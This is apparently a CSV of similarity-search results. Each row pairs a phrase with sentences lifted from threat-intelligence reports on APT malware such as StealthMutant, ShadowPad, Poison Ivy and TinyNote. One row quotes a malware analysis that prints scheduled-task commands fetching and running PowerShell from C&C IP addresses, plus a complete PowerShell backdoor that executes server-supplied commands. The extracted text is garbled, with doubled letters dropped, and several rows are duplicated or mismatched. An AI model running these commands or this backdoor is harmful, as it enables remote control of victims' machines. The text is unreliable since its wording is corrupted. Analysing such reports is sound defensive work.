hash,phrase,similarity,adjacent_sentences
b5d067b705e3d7716dc5cd360e61cc7d,to decrypt the payload,0.770388922287375,"['The execution of StealthMutant through InstalUtil.exe InstalUtil.exe is a legitimate instaler aplication under Microsofts .NET Framework, but it is also known as a living-of-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstalUtil.exe is registered to run StealthMutant, as demonstrated in Figure 1.', 'Figure 1.', 'InstalUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Technical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shelcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shelcode loader writen in C# that has ben in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote proces, and then executes it.', 'We have observed that its payload has ben either the Cobalt Strike beacon or the ScrambleCros backdor.', 'Most of the StealthMutant samples we have come acros are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework aplications.', 'After deobfuscating these samples, we have observed raw namespaces and clases that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and clases from the deobfuscated samples 1 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Al the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
b5d067b705e3d7716dc5cd360e61cc7d,decrypt it,0.8988606746601266,"['The execution of StealthMutant through InstalUtil.exe InstalUtil.exe is a legitimate instaler aplication under Microsofts .NET Framework, but it is also known as a living-of-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstalUtil.exe is registered to run StealthMutant, as demonstrated in Figure 1.', 'Figure 1.', 'InstalUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Technical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shelcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shelcode loader writen in C# that has ben in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote proces, and then executes it.', 'We have observed that its payload has ben either the Cobalt Strike beacon or the ScrambleCros backdor.', 'Most of the StealthMutant samples we have come acros are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework aplications.', 'After deobfuscating these samples, we have observed raw namespaces and clases that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and clases from the deobfuscated samples 1 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Al the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
2f9cb1419d88d162b0fe29430bf53db3,"API obfuscation, and execution flow obfuscation",0.7891020997535929,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']"
2f9cb1419d88d162b0fe29430bf53db3,"API obfuscation, and execution flow obfuscation",0.7891020997535929,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']"
2f9cb1419d88d162b0fe29430bf53db3,"API obfuscation, and execution flow obfuscation",0.7891020997535929,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']"
54739c05e5c102ca2f434bf7436f19fa,proxy,0.7810083562863923,"['Securelist.', 'August 2015. can even be such a thing.', 'In a hypothetical scenario where we htps:/securelist.com/blog/research/71713/darkhotels- have packets captured en route (as in the comon jab PCAP or atacks-in-2015/.', 'GTFO), could it not be a backdored system being used to [2] Schneier, B.', 'Simultaneous Discovery of Vulnerabilities.', 'proxy through?', 'Where we catch a nation-state operator Schneier on Security.', 'February 2016. red-handed, would we not ned an understanding of the htps:/w.schneier.com/blog/archives/2016/02/ provenance of their tasking?', 'More realisticaly, there wil never simultaneous_di.html.', 'be a solid enough atribution claim for everyone to get behind.', 'Rather, the combination of multiple indicators helps an analyst [3] Equation Group: Questions and Answers.']"
54739c05e5c102ca2f434bf7436f19fa,proxy,0.7810083562863923,"['Securelist.', 'August 2015. can even be such a thing.', 'In a hypothetical scenario where we htps:/securelist.com/blog/research/71713/darkhotels- have packets captured en route (as in the comon jab PCAP or atacks-in-2015/.', 'GTFO), could it not be a backdored system being used to [2] Schneier, B.', 'Simultaneous Discovery of Vulnerabilities.', 'proxy through?', 'Where we catch a nation-state operator Schneier on Security.', 'February 2016. red-handed, would we not ned an understanding of the htps:/w.schneier.com/blog/archives/2016/02/ provenance of their tasking?', 'More realisticaly, there wil never simultaneous_di.html.', 'be a solid enough atribution claim for everyone to get behind.', 'Rather, the combination of multiple indicators helps an analyst [3] Equation Group: Questions and Answers.']"
937553fb8e3ba631cb28165aa71a66da,proxy,0.7569189103367252,"['File might have random apended data (Depends on the configs 0x92 flag at ofset 0x326).', '0xA0 Loaders filepath Table 2 Shadowpad Data Types 3/12 Once one of the above bytes are located, ShadowPad reads the data (size is defined before the byte identifier) and apends the last DWORD value to the hardcoded byte aray 1A915B2D21384C6DA3C21FCA5201A4.', 'Then it hashes (MD5) the constructed byte aray and derives an AES-CBC 128bits key and decrypts the data.', 'In adition, ShadowPad stores, in an encrypted format, the folowing data in the registry with the registry key name being unique (based on volume serial number of C:\\) for each compromised host: 1.', 'ShadowPad configuration (0x80) data.', '2.', 'Proxy configuration.', 'Includes proxy information that ShadowPad requires.', 'These are the network comunication protocol, domain/IP proxy and the proxy port.', '3.', 'Downloaded modules.']"
9cd7c673b04415e320b2ceea1c818934,proxy,0.7691225825819927,"['Wel-trained and ready users, informed with the latest threat inteligence on adversary activity, are the first line of defense.', '3.', 'End User Device Security.', 'Adaptable endpoint security is critical to stoping this type of atack early, especialy for users working from home and not behind the enterprise web proxy or other layered defensive capability.', 'Stoping or detecting the first two stages of infection requires an endpoint security capability of identifying file-les malware, particularly malicious Ofice documents and persistence techniques that leverage start-up folder modification.', '4.', 'Web Proxy.', 'A secure web gateway is an esential part of enterprise security architecture and, in this scenario, can restrict aces to malicious web sites and block aces to the comand and control sites.', '5.', 'Sec Ops Endpoint Detection and Response (EDR) can be used to detect techniques most likely in stages 1, 2 or 4.', 'Aditionaly, EDR can be used to search for the initial documents and other indicators provided through threat analysis.']"
9cd7c673b04415e320b2ceea1c818934,proxy,0.7691225825819927,"['Wel-trained and ready users, informed with the latest threat inteligence on adversary activity, are the first line of defense.', '3.', 'End User Device Security.', 'Adaptable endpoint security is critical to stoping this type of atack early, especialy for users working from home and not behind the enterprise web proxy or other layered defensive capability.', 'Stoping or detecting the first two stages of infection requires an endpoint security capability of identifying file-les malware, particularly malicious Ofice documents and persistence techniques that leverage start-up folder modification.', '4.', 'Web Proxy.', 'A secure web gateway is an esential part of enterprise security architecture and, in this scenario, can restrict aces to malicious web sites and block aces to the comand and control sites.', '5.', 'Sec Ops Endpoint Detection and Response (EDR) can be used to detect techniques most likely in stages 1, 2 or 4.', 'Aditionaly, EDR can be used to search for the initial documents and other indicators provided through threat analysis.']"
c5015c07f1dfdf29e9638da275dcaf47,Windows API,0.7851647481362197,"['ESET Research Whitepapers / August 2018 TURL A OUTLOK BACKDOR Analysis of an unusual Turla backdor 2 Turla Outlok Backdor / Analysis of an unusual Turla backdor 1.', 'CONTENTS 1.', 'Introduction.', '.', '.', '.', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,Windows API,0.7851647481362197,"['ESET Research Whitepapers / August 2018 TURL A OUTLOK BACKDOR Analysis of an unusual Turla backdor 2 Turla Outlok Backdor / Analysis of an unusual Turla backdor 1.', 'CONTENTS 1.', 'Introduction.', '.', '.', '.', '.', '.', '.']"
62589cf5643f8cfe04ac39602119309c,Windows API,0.7851647481362197,"['2. id .', 'POST.', ': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 3589"", ""Last Ad rub 67"" ] } 1. : {ip}:9850/api/rubriclist?Parent=-1 / {ip}:9850/api/rubriclist?Parent=20 / Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": nul, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25 },. ]', ': Url=""/json/rubrics/5 2. : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""A"", ""Name"": ""A-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },. ]', 'API .', '.', ', .', '.', '- .', '26 - , (), (), ().', '- .']"
62589cf5643f8cfe04ac39602119309c,Windows API,0.7851647481362197,"['2. id .', 'POST.', ': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 3589"", ""Last Ad rub 67"" ] } 1. : {ip}:9850/api/rubriclist?Parent=-1 / {ip}:9850/api/rubriclist?Parent=20 / Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": nul, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25 },. ]', ': Url=""/json/rubrics/5 2. : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""A"", ""Name"": ""A-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },. ]', 'API .', '.', ', .', '.', '- .', '26 - , (), (), ().', '- .']"
62589cf5643f8cfe04ac39602119309c,Windows API,0.7851647481362197,"['2. id .', 'POST.', ': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 3589"", ""Last Ad rub 67"" ] } 1. : {ip}:9850/api/rubriclist?Parent=-1 / {ip}:9850/api/rubriclist?Parent=20 / Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": nul, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25 },. ]', ': Url=""/json/rubrics/5 2. : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""A"", ""Name"": ""A-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },. ]', 'API .', '.', ', .', '.', '- .', '26 - , (), (), ().', '- .']"
57c72cba1b008593ba3d60f214807584,Windows API,0.7851647481362197,"['Initializing module poisonivy_23x Transfered files wil be saved.', 'Scren/Cam/Audio/Key captures wil be saved.', 'Runing Modules .', '[2013-07-03 06:46:29 PDT] Poison Ivy Version:2.32 [2013-07-03 06:46:30 PDT]* Host Information* PI profile ID: mal IP adres: 192.168.0.12 Hostname: BLUE Windows User: admin Windows Version: Windows XP Windows Build: 260 Service Pack: Service Pack 3 [2013-07-03 06:46:36 PDT] * Shel Sesion * Microsoft Windows XP [Version 5.1.260] (C) Copyright 1985-201 Microsoft Corp. C:\\> [2013-07-03 06:46:42 PDT] * Shel Sesion * ipconfig [2013-07-03 06:46:43 PDT] * Shel Sesion * Windows IP Configuration Conection-specific DNS Sufix .', ': IP Adres.', '.', '.', '.', '.', '.', '.']"
7fd321bf3d665b1e21967c3a8052d876,Windows API,0.7851647481362197,"['Initializing module poisonivy_23x Transfered files wil be saved.', 'Scren/Cam/Audio/Key captures wil be saved.', 'Runing Modules .', '[2013-07-03 06:46:29 PDT] Poison Ivy Version:2.32 [2013-07-03 06:46:30 PDT]* Host Information* PI profile ID: mal IP adres: 192.168.0.12 Hostname: BLUE Windows User: admin Windows Version: Windows XP Windows Build: 260 Service Pack: Service Pack 3 [2013-07-03 06:46:36 PDT] * Shel Sesion * Microsoft Windows XP [Version 5.1.260] (C) Copyright 1985-201 Microsoft Corp. C:\\> [2013-07-03 06:46:42 PDT] * Shel Sesion * ipconfig [2013-07-03 06:46:43 PDT] * Shel Sesion * Windows IP Configuration Conection-specific DNS Sufix .', ': IP Adres.', '.', '.', '.', '.', '.', '.']"
22a069efb6997235b32a9c908f7b7300,"the malware creates a scheduled task to execute its copy from this randomized path:

schtasks /Create /TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR ""explorer.exe c:\users\public\8NaZrCq3pGeDRXKF.zip\8NaZr.exe"" /f",0.8779803971078495,"['If this is not found, it continues the execution flow.', 'First, it creates the directory c:\\programdata\\Robots.', 'If this fails, the malware does not continue the execution, likely because the infected user only has low privileges.', 'Next, the malware creates 2 scheduled tasks caled test and test2 to retrieve and execute PowerShel comands, each retrieved from robots.txt from diferent C&C servers, most likely to eliminate a single point of failure: schtasks /Create /TN test /SC MINUTE /MO 15 /TR ""powershel \\""$r= [System.Net.WebRequest]:Create(\\""htp:/5.18.3.190/Robots.txt\\"");(new- object System.IO.StreamReader($r.GetResponse().GetResponseStream().ReadToEnd() | powershel.exe -noprofile -\\"" /f schtasks /Create /TN test2 /SC MINUTE /MO 45 /TR ""powershel \\""$r= [System.Net.WebRequest]:Create(\\""htp:/103.159.132.91/Robots.txt\\""); (new-object System.IO.StreamReader($r.GetResponse().GetResponseStream().ReadToEnd() | powershel.exe -noprofile -\\"" /f At the time of execution, both servers returned the same code pointing to the third server: C:\\Windows\\System32\\cmd.exe /c ""start powershel.exe -nop -c set-alias exi iex;`$v1=\'iex (new-object net.webclient).dow\';`$v2=\'nloadstring(\'htp:/\';`$v3=\'103.159.132.91/robots1.txt\')\';exi(`$v1+ The final payload returned is a lightweight PowerShel backdor, which retrieves a list of comands from the CMD header from the C&C server response, executes them with Invoke-Expresion, concatenates the outputs with \'_n1w_\' string, and sends them back to the server in POST request: $WindowState = \'[DlImport(""user32.dl"")] public static extern bol ShowWindow(int handle, int stat);\';ad-type -name win -member $WindowState - namespace native; [native.win]:ShowWindow([System.Diagnostics.Proces]:GetCurentProces() | Get-Proces).MainWindowHandle, 0); $url=""htp:/103.159.132.91:8081/""; $postParams = \'result=start\'; while (1 -eq 1) { try { $data = [System.Text.Encoding]:UTF8.GetBytes($postParams); $req = [System.Net.WebRequest]:Create($url); $req.ServicePoint.ConectionLimit =6535; If ($req.ServicePoint.CurentConections -ge 10) { $req.ServicePoint.CloseConectionGroup("") } $req.ServicePoint.Expect10Continue = $false; #$req.Timeout = 10; $req.Method = ""POST""; $req.ContentType = ""aplication/x-w-form-urlencoded""; $req.ContentLength = $data.Length; $Stream = $req.GetRequestStream(); $Stream.Write($data, 0, $data.Length);$Stream.Flush();$Stream.Close(); #waiting remote [System.Net.WebResponse] $resp = $req.GetResponse();$header=$resp.GetResponseHeader(\'CMD\'); $d = [System.Convert]:FromBase64String($header); $Ds = [System.Text.Encoding]:UTF8.GetString($d);$result = ""; Foreach ($string in invoke-expresion $Ds) {$result=$result+\'_n1w_\'+$string;}; $result = [Convert]:ToBase64String([System.Text.Encoding]:UTF8.GetBytes($result); $postParams = ""result=$result""; } 4/6 catch{}; }; The malware then copies itself to the zip file with the name [16 random characters].zip in c:\\users\\public\\, and also creates another copy of itself to the path using the zip name as a folder, for example, c:\\users\\public\\pMiOxI3G4Igrpq7.zip\\.', 'Both the file inside the zip and the unziped copy of the file get the same randomly generated name [5 random characters].exe, for example, 8q3Fj.exe.', 'Finaly, the malware creates a scheduled task to execute its copy from this randomized path: schtasks /Create /TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR ""explorer.exe c:\\users\\public\\8NaZrCq3pGeDRXKF.zip\\8NaZr.exe"" /f Second mode: the backdor This mode hapens after the malware has achieved persistence and is runing from a zip path.', 'First, the malware enumerates the system for the folowing data and concatenates it to one string: The curent system username The curent username home folder The systems network interfaces (name, MacAdres, description) Next, it encrypts the string using a simple XOR encryption algorithm with the key NASA and Base64 encodes it afterward.', 'It then picks one random C&C URL out of the thre available and constructs a GET request: htp:/5.18.3.190/api.php htp:/103.169.90.132/api.php htp:/103.159.132.91/api.php The encoded enumeration data is stored in a cokie caled SN.', 'Other headers in the request are constructed from serval random values.', 'The hostname header is selected from the folowing list: The user-agent is also randomized and is selected from the folowing list: Mozila/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/2010101 Firefox/103.0 Mozila/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) ApleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1 Mozila/5.0 (X1; Ubuntu; Linux x86_64; rv:63.0) Gecko/2010101 Firefox/63.0 Mozila/5.0 (Windows NT 10.0; Win64; x64) ApleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 The expected result from the server is a JSON with the folowing structure: {""msg"":""[BASE64-ENCODED COMAND]""} After the validation of the JSON and Base64 decoding, the malware creates a Goroutine that executes the comand and continues to listen for more comands in a lop.', 'Atribution In adition to the fact that one of the backdor versions was found on the Camaro Dragon distribution server, there are other strong conections betwen the actors and the TinyNote malware: The server 103.159.132[.']"
73ae3d11837c3f9dbcfc8f41544bb20e,ipconfig,0.80966835917559,"[' .', '2017.', '2 0 1 7.', '- (Ii -) .46535.I5 3 474 2 0 1 7.', '2017 1 3 1.1 .3 1.2 .3 1.3 .3 1.4 .5 1.5 , , , , .25 1.6 - .30 1.7 .31 1.8 .31 1.9 .31 32 314 320 2 1 1.1 1.1.1 ( ) () - RU.0176-01 ( ), , - () .', '1.2 1.2.1 - () - 1 , - .']"
3e9312913ace03550c810e6b92ab1d61,they also used tasklist,0.7743869862312265,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
3e9312913ace03550c810e6b92ab1d61,they also used tasklist,0.7743869862312265,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
d5019121cbc645eb0787efab173a12b3,wmic,0.7832871736269563,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
949b57ffdfcc42e1765f65e65995733b,wmic,0.862634642643921,[]
